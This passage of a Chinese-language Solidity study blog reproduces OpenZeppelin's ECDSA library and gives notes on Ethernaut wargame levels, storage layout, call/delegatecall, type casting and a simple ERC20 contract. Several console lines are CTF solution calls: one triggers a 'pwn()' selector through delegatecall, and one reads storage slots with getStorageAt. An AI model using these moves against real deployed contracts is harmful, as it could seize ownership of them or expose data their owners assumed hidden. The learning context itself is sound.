class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"><span class="comment">// OpenZeppelin Contracts (last updated v4.7.0) (utils/cryptography/ECDSA.sol)</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">import <span class="string">&quot;../StringsUpgradeable.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @dev Elliptic Curve Digital Signature Algorithm (ECDSA) operations.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * These functions can be used to verify that a message was signed by the holder</span></span><br><span class="line"><span class="comment"> * of the private keys of a given address.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">library ECDSAUpgradeable &#123;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">RecoverError</span> &#123;</span></span><br><span class="line">        NoError,</span><br><span class="line">        InvalidSignature,</span><br><span class="line">        InvalidSignatureLength,</span><br><span class="line">        InvalidSignatureS,</span><br><span class="line">        InvalidSignatureV <span class="comment">// Deprecated in v4.8</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _throwError(RecoverError error) private pure &#123;</span><br><span class="line">        <span class="keyword">if</span> (error == RecoverError.NoError) &#123;</span><br><span class="line">            <span class="keyword">return</span>; <span class="comment">// no error: do nothing</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (error == RecoverError.InvalidSignature) &#123;</span><br><span class="line">            revert(<span class="string">&quot;ECDSA: invalid signature&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (error == RecoverError.InvalidSignatureLength) &#123;</span><br><span class="line">            revert(<span class="string">&quot;ECDSA: invalid signature length&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (error == RecoverError.InvalidSignatureS) &#123;</span><br><span class="line">            revert(<span class="string">&quot;ECDSA: invalid signature &#x27;s&#x27; value&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Returns the address that signed a hashed message (`hash`) with</span></span><br><span class="line"><span class="comment">     * `signature` or error string. This address can then be used for verification purposes.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * The `ecrecover` EVM opcode allows for malleable (non-unique) signatures:</span></span><br><span class="line"><span class="comment">     * this function rejects them by requiring the `s` value to be in the lower</span></span><br><span class="line"><span class="comment">     * half order, and the `v` value to be either 27 or 28.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * IMPORTANT: `hash` _must_ be the result of a hash operation for the</span></span><br><span class="line"><span class="comment">     * verification to be secure: it is possible to craft signatures that</span></span><br><span class="line"><span class="comment">     * recover to arbitrary addresses for non-hashed data. A safe way to ensure</span></span><br><span class="line"><span class="comment">     * this is by receiving a hash of the original message (which may otherwise</span></span><br><span class="line"><span class="comment">     * be too long), and then calling &#123;toEthSignedMessageHash&#125; on it.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Documentation for signature generation:</span></span><br><span class="line"><span class="comment">     * - with https://web3js.readthedocs.io/en/v1.3.4/web3-eth-accounts.html#sign[Web3.js]</span></span><br><span class="line"><span class="comment">     * - with https://docs.ethers.io/v5/api/signer/#Signer-signMessage[ethers]</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * _Available since v4.3._</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">tryRecover</span><span class="params">(bytes32 hash, bytes memory signature)</span> internal pure <span class="title function_">returns</span> <span class="params">(address, RecoverError)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (signature.length == <span class="number">65</span>) &#123;</span><br><span class="line">            bytes32 r;</span><br><span class="line">            bytes32 s;</span><br><span class="line">            uint8 v;</span><br><span class="line">            <span class="comment">// ecrecover takes the signature parameters, and the only way to get them</span></span><br><span class="line">            <span class="comment">// currently is to use assembly.</span></span><br><span class="line">            <span class="comment">/// @solidity memory-safe-assembly</span></span><br><span class="line">            assembly &#123;</span><br><span class="line">                r := mload(add(signature, <span class="number">0x20</span>))</span><br><span class="line">                s := mload(add(signature, <span class="number">0x40</span>))</span><br><span class="line">                v := byte(<span class="number">0</span>, mload(add(signature, <span class="number">0x60</span>)))</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> tryRecover(hash, v, r, s);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> (address(<span class="number">0</span>), RecoverError.InvalidSignatureLength);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Returns the address that signed a hashed message (`hash`) with</span></span><br><span class="line"><span class="comment">     * `signature`. This address can then be used for verification purposes.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * The `ecrecover` EVM opcode allows for malleable (non-unique) signatures:</span></span><br><span class="line"><span class="comment">     * this function rejects them by requiring the `s` value to be in the lower</span></span><br><span class="line"><span class="comment">     * half order, and the `v` value to be either 27 or 28.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * IMPORTANT: `hash` _must_ be the result of a hash operation for the</span></span><br><span class="line"><span class="comment">     * verification to be secure: it is possible to craft signatures that</span></span><br><span class="line"><span class="comment">     * recover to arbitrary addresses for non-hashed data. A safe way to ensure</span></span><br><span class="line"><span class="comment">     * this is by receiving a hash of the original message (which may otherwise</span></span><br><span class="line"><span class="comment">     * be too long), and then calling &#123;toEthSignedMessageHash&#125; on it.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">recover</span><span class="params">(bytes32 hash, bytes memory signature)</span> internal pure <span class="title function_">returns</span> <span class="params">(address)</span> &#123;</span><br><span class="line">        (address recovered, RecoverError error) = tryRecover(hash, signature);</span><br><span class="line">        _throwError(error);</span><br><span class="line">        <span class="keyword">return</span> recovered;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Overload of &#123;ECDSA-tryRecover&#125; that receives the `r` and `vs` short-signature fields separately.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * See https://eips.ethereum.org/EIPS/eip-2098[EIP-2098 short signatures]</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * _Available since v4.3._</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">tryRecover</span><span class="params">(</span></span><br><span class="line"><span class="params">        bytes32 hash,</span></span><br><span class="line"><span class="params">        bytes32 r,</span></span><br><span class="line"><span class="params">        bytes32 vs</span></span><br><span class="line"><span class="params">    )</span> internal pure <span class="title function_">returns</span> <span class="params">(address, RecoverError)</span> &#123;</span><br><span class="line">        bytes32 s = vs &amp; bytes32(<span class="number">0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span>);</span><br><span class="line">        uint8 v = uint8((uint256(vs) &gt;&gt; <span class="number">255</span>) + <span class="number">27</span>);</span><br><span class="line">        <span class="keyword">return</span> tryRecover(hash, v, r, s);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Overload of &#123;ECDSA-recover&#125; that receives the `r and `vs` short-signature fields separately.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * _Available since v4.2._</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">recover</span><span class="params">(</span></span><br><span class="line"><span class="params">        bytes32 hash,</span></span><br><span class="line"><span class="params">        bytes32 r,</span></span><br><span class="line"><span class="params">        bytes32 vs</span></span><br><span class="line"><span class="params">    )</span> internal pure <span class="title function_">returns</span> <span class="params">(address)</span> &#123;</span><br><span class="line">        (address recovered, RecoverError error) = tryRecover(hash, r, vs);</span><br><span class="line">        _throwError(error);</span><br><span class="line">        <span class="keyword">return</span> recovered;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Overload of &#123;ECDSA-tryRecover&#125; that receives the `v`,</span></span><br><span class="line"><span class="comment">     * `r` and `s` signature fields separately.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * _Available since v4.3._</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">tryRecover</span><span class="params">(</span></span><br><span class="line"><span class="params">        bytes32 hash,</span></span><br><span class="line"><span class="params">        uint8 v,</span></span><br><span class="line"><span class="params">        bytes32 r,</span></span><br><span class="line"><span class="params">        bytes32 s</span></span><br><span class="line"><span class="params">    )</span> internal pure <span class="title function_">returns</span> <span class="params">(address, RecoverError)</span> &#123;</span><br><span class="line">        <span class="comment">// EIP-2 still allows signature malleability for ecrecover(). Remove this possibility and make the signature</span></span><br><span class="line">        <span class="comment">// unique. Appendix F in the Ethereum Yellow paper (https://ethereum.github.io/yellowpaper/paper.pdf), defines</span></span><br><span class="line">        <span class="comment">// the valid range for s in (301): 0 &lt; s &lt; secp256k1n ÷ 2 + 1, and for v in (302): v ∈ &#123;27, 28&#125;. Most</span></span><br><span class="line">        <span class="comment">// signatures from current libraries generate a unique signature with an s-value in the lower half order.</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// If your library generates malleable signatures, such as s-values in the upper range, calculate a new s-value</span></span><br><span class="line">        <span class="comment">// with 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141 - s1 and flip v from 27 to 28 or</span></span><br><span class="line">        <span class="comment">// vice versa. If your library also generates signatures with 0/1 for v instead 27/28, add 27 to v to accept</span></span><br><span class="line">        <span class="comment">// these malleable signatures as well.</span></span><br><span class="line">        <span class="keyword">if</span> (uint256(s) &gt; <span class="number">0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> (address(<span class="number">0</span>), RecoverError.InvalidSignatureS);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// If the signature is valid (and not malleable), return the signer address</span></span><br><span class="line">        address signer = ecrecover(hash, v, r, s);</span><br><span class="line">        <span class="keyword">if</span> (signer == address(<span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> (address(<span class="number">0</span>), RecoverError.InvalidSignature);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (signer, RecoverError.NoError);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Overload of &#123;ECDSA-recover&#125; that receives the `v`,</span></span><br><span class="line"><span class="comment">     * `r` and `s` signature fields separately.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">recover</span><span class="params">(</span></span><br><span class="line"><span class="params">        bytes32 hash,</span></span><br><span class="line"><span class="params">        uint8 v,</span></span><br><span class="line"><span class="params">        bytes32 r,</span></span><br><span class="line"><span class="params">        bytes32 s</span></span><br><span class="line"><span class="params">    )</span> internal pure <span class="title function_">returns</span> <span class="params">(address)</span> &#123;</span><br><span class="line">        (address recovered, RecoverError error) = tryRecover(hash, v, r, s);</span><br><span class="line">        _throwError(error);</span><br><span class="line">        <span class="keyword">return</span> recovered;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Returns an Ethereum Signed Message, created from a `hash`. This</span></span><br><span class="line"><span class="comment">     * produces hash corresponding to the one signed with the</span></span><br><span class="line"><span class="comment">     * https://eth.wiki/json-rpc/API#eth_sign[`eth_sign`]</span></span><br><span class="line"><span class="comment">     * JSON-RPC method as part of EIP-191.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * See &#123;recover&#125;.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">toEthSignedMessageHash</span><span class="params">(bytes32 hash)</span> internal pure <span class="title function_">returns</span> <span class="params">(bytes32)</span> &#123;</span><br><span class="line">        <span class="comment">// 32 is the length in bytes of hash,</span></span><br><span class="line">        <span class="comment">// enforced by the type signature above</span></span><br><span class="line">        <span class="keyword">return</span> keccak256(abi.encodePacked(<span class="string">&quot;\x19Ethereum Signed Message:\n32&quot;</span>, hash));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Returns an Ethereum Signed Message, created from `s`. This</span></span><br><span class="line"><span class="comment">     * produces hash corresponding to the one signed with the</span></span><br><span class="line"><span class="comment">     * https://eth.wiki/json-rpc/API#eth_sign[`eth_sign`]</span></span><br><span class="line"><span class="comment">     * JSON-RPC method as part of EIP-191.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * See &#123;recover&#125;.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">toEthSignedMessageHash</span><span class="params">(bytes memory s)</span> internal pure <span class="title function_">returns</span> <span class="params">(bytes32)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> keccak256(abi.encodePacked(<span class="string">&quot;\x19Ethereum Signed Message:\n&quot;</span>, StringsUpgradeable.toString(s.length), s));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Returns an Ethereum Signed Typed Data, created from a</span></span><br><span class="line"><span class="comment">     * `domainSeparator` and a `structHash`. This produces hash corresponding</span></span><br><span class="line"><span class="comment">     * to the one signed with the</span></span><br><span class="line"><span class="comment">     * https://eips.ethereum.org/EIPS/eip-712[`eth_signTypedData`]</span></span><br><span class="line"><span class="comment">     * JSON-RPC method as part of EIP-712.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * See &#123;recover&#125;.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">toTypedDataHash</span><span class="params">(bytes32 domainSeparator, bytes32 structHash)</span> internal pure <span class="title function_">returns</span> <span class="params">(bytes32)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> keccak256(abi.encodePacked(<span class="string">&quot;\x19\x01&quot;</span>, domainSeparator, structHash));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> -solidity学习笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>solidity刷题知识点ethernaut</title>
      <link href="/2022/12/15/solidity/solidity%E5%88%B7%E9%A2%98%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
      <url>/2022/12/15/solidity/solidity%E5%88%B7%E9%A2%98%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<h2 id="发送交易信息的另一种方法"><a href="#发送交易信息的另一种方法" class="headerlink" title="发送交易信息的另一种方法"></a>发送交易信息的另一种方法</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">await contract.sendTransactio(&#123;data:web3.sha3(<span class="string">&quot;pwn()&quot;</span>).slice(<span class="number">0</span>,<span class="number">10</span>)&#125;);</span><br><span class="line">await contract.sendTransaction(&#123;value:<span class="number">1</span>&#125;);</span><br><span class="line">await contract.sendTransaction(&#123;data:<span class="number">0xdd365b8b</span>&#125;);<span class="comment">//函数签名</span></span><br></pre></td></tr></table></figure><h2 id="以太坊数据储存形式的知识"><a href="#以太坊数据储存形式的知识" class="headerlink" title="以太坊数据储存形式的知识"></a>以太坊数据储存形式的知识</h2><ul><li>存储插槽的第一项会以低位对齐（即右对齐）的方式储存</li><li>基本类型仅使用存储它们所需的字节</li><li>如果存储插槽中的剩余空间不足以储存一个基本类型，那么它会被移  入 下一个存储插槽</li><li>结构和数组数据总是会占用一整个新插槽（但结构或数组中的各项，都会以这些规则进行打包）</li></ul><p>每一个槽有32个字节<br>数字：四位一字节<br>字母：两位一字节<br>布尔值：一个字节<br>bytes32就是32个字节<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">address a;<span class="comment">//20  槽0</span></span><br><span class="line">uint8 b;<span class="comment">//1      槽0</span></span><br><span class="line">uint c;<span class="comment">//32    槽1</span></span><br><span class="line"><span class="type">bool</span> d;<span class="comment">//1         槽2</span></span><br><span class="line"><span class="comment">//数据的排列方式为从右向左依次排列</span></span><br></pre></td></tr></table></figure><br>在ethernaut中<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">await web3.eth.getStorageAt(contract.address,1)//用来获取合约中变量在链上的储存状态，其中1是指第一个槽中的变量</span><br></pre></td></tr></table></figure><br>所有区块链上的东西没有秘密</p><h2 id="调用且传入data"><a href="#调用且传入data" class="headerlink" title="调用且传入data"></a>调用且传入data</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">await contract.sendTransaction(&#123;data:web3.utils.keccak256(<span class="string">&quot;pwn()&quot;</span>).slice(<span class="number">0</span>,<span class="number">10</span>)&#125;)</span><br><span class="line"><span class="comment">//slice（0，10）与bytes4和abi一样；</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/12/15/19a3QFGLztTgo2D.png" alt="屏幕截图_20221215_142740.png"></p><h2 id="call与delegation"><a href="#call与delegation" class="headerlink" title="call与delegation"></a>call与delegation</h2><p><strong>call: 最常用的调用方式，调用后内置变量 msg 的值会修改为调用者B，执行环境为被调用者的运行环境C。</strong><br><strong>delegatecall:调用后内置变量 msg 的值A不会修改为调用者，但执行环境为调用者的运行环境B</strong><br><strong>callcode:调用后内置变量 msg 的值会修改为调用者B，执行环境也为调用者的运行环境B</strong></p><h2 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h2><p><strong>如果是uint或者int同类型强制转换，就是从最低位截断(十六进制下，或者从最高位补0。</strong><br><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint32</span> a = <span class="number">0x12345678</span>; <span class="type">uint16</span> b = <span class="type">uint16</span>(a); <span class="comment">// b will be 0x5678 now uint16 a = 0x1234; </span></span><br><span class="line"><span class="type">uint32</span> b = <span class="type">uint32</span>(a); <span class="comment">// b will be 0x00001234 now assert(a == b);</span></span><br></pre></td></tr></table></figure><br><strong>对于bytes类型就是从最低位补0或者从最高位开始保留，这样就没有改变原来的下标。</strong><br><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bytes2 a = <span class="number">0x1234</span>; bytes4 b = bytes4(a); </span><br><span class="line"><span class="comment">// b will be 0x12340000 assert(a[0] == b[0]); assert(a[1] == b[1]);</span></span><br></pre></td></tr></table></figure></p><p><strong>只有具有相同字节数的整数和bytes类型才允许之间的强制转换，不同长度的需要中间过渡。</strong><br><strong>注意：bytes32,表示32个字节，一个字节是8位；int256这样指的是二进制位。</strong><br><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bytes2 a = <span class="number">0x1234</span>; <span class="type">uint32</span> b = <span class="type">uint16</span>(a); <span class="comment">// b will be 0x00001234 </span></span><br><span class="line"><span class="type">uint32</span> c = <span class="type">uint32</span>(bytes4(a)); <span class="comment">// c will be 0x12340000 uint8 d = uint8(uint16(a)); // d will be 0x34 </span></span><br><span class="line"><span class="type">uint8</span> e = <span class="type">uint8</span>(bytes1(a)); <span class="comment">// e will be 0x12</span></span><br></pre></td></tr></table></figure></p><h2 id="ECR20分析"><a href="#ECR20分析" class="headerlink" title="ECR20分析"></a>ECR20分析</h2><p><strong>委托交易在区块链中用的可能很少，在生活中很多，但是ERC20实现起来似乎感觉很难理解！这里深度剖析一下委托交易是怎么个原理！[作者蒲公英云]</strong></p><p><strong>委托转账原理分析：</strong></p><p><strong>假设：A账号有10000个token代币,B账号没有token代币,C账号也没有token代币！</strong><br><strong>那么：A账号 委托 B账号 转给C账号 100个token代币 怎么来实现呢？</strong><br><strong>首先：A账号 和 B账号建立一种委托关联,登录A账户执行approve(b,100)方法结果为：结果：_allowed[A][B] = 100token</strong><br><strong>然后：在执行登录B账户执行transferFrom(A,C,100),这里的B就是委托账号发送者,gas从B扣,必须确保token数量小于_allowed[A][B]</strong><br><strong>总结：其实就是A转入C,但是要经过B的账号来发送交易！</strong><br><strong>委托转账原理分析： </strong>假设：A账号有10000个token代币,B账号没有token代币,C账号也没有token代币！<strong> </strong>那么：A账号 委托 B账号 转给C账号 100个token代币 怎么来实现呢？<strong> </strong>首先：A账号 和 B账号建立一种委托关联,登录A账户执行approve(b,100)方法结果为：结果：_allowed[A][B] = 100token<strong>  </strong>然后：在执行登录B账户执行transferFrom(A,C,100),这里的B就是委托账号发送者,gas从B扣,必须确保token数量小于_allowed[A][B]<strong>    </strong>总结：其实就是A转入C,但是要经过B的账号来发送交易！**<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.15</span>;</span><br><span class="line"></span><br><span class="line"> interface IERC20 &#123;</span><br><span class="line">    function <span class="title function_">totalSupply</span><span class="params">()</span> external view <span class="title function_">returns</span><span class="params">(uint)</span>;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">balanceOf</span><span class="params">(address account)</span> external view <span class="title function_">returns</span><span class="params">(uint)</span>;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">transfer</span><span class="params">(address recipient, uint amount)</span> external <span class="title function_">returns</span><span class="params">(<span class="type">bool</span>)</span>;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">allowance</span><span class="params">(address owner, address spender)</span> external view <span class="title function_">returns</span><span class="params">(uint)</span>;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">approve</span><span class="params">(address spender, uint amount)</span> external <span class="title function_">returns</span><span class="params">(<span class="type">bool</span>)</span>;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">tranferFrom</span><span class="params">(address sender, address recipient, uint amount)</span> external <span class="title function_">returns</span><span class="params">(<span class="type">bool</span>)</span>;</span><br><span class="line"></span><br><span class="line">    event <span class="title function_">Transfer</span><span class="params">(address indexed from, address indexed to, uint amount)</span>;</span><br><span class="line">    event <span class="title function_">Approve</span><span class="params">(address indexed owner, address indexed spender, uint amount)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ERC20 is IERC20&#123;</span><br><span class="line">    uint public totalSupply;</span><br><span class="line">    mapping(address=&gt;uint) public balanceOf;</span><br><span class="line">    mapping(address=&gt;mapping(address=&gt;uint)) public allowance;</span><br><span class="line">    <span class="built_in">string</span> public name= <span class="string">&quot;Test&quot;</span>;</span><br><span class="line">    <span class="built_in">string</span> public symbol=<span class="string">&quot;TEST&quot;</span>;</span><br><span class="line">    uint8 public decimals=<span class="number">18</span>;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">transfer</span><span class="params">(address recipient, uint amount)</span> external <span class="title function_">returns</span><span class="params">(<span class="type">bool</span>)</span>&#123;</span><br><span class="line">        balanceOf[msg.sender] -= amount;</span><br><span class="line">        balanceOf[recipient] += amount;</span><br><span class="line">        emit <span class="title function_">Transfer</span><span class="params">(msg.sender, recipient,amount)</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">approve</span><span class="params">(address spender, uint amount)</span> external <span class="title function_">returns</span><span class="params">(<span class="type">bool</span>)</span> &#123;</span><br><span class="line">        allowance[msg.sender][spender]= amount;</span><br><span class="line">        emit <span class="title function_">Approve</span><span class="params">(msg.sender,spender,amount)</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">tranferFrom</span><span class="params">(address sender, address recipient, uint amount)</span> external <span class="title function_">returns</span><span class="params">(<span class="type">bool</span>)</span>&#123;</span><br><span class="line">        allowance[sender][msg.sender] -= amount;</span><br><span class="line">        balanceOf[sender] -= amount;</span><br><span class="line">        balanceOf[recipient] += amount;</span><br><span class="line">        emit <span class="title 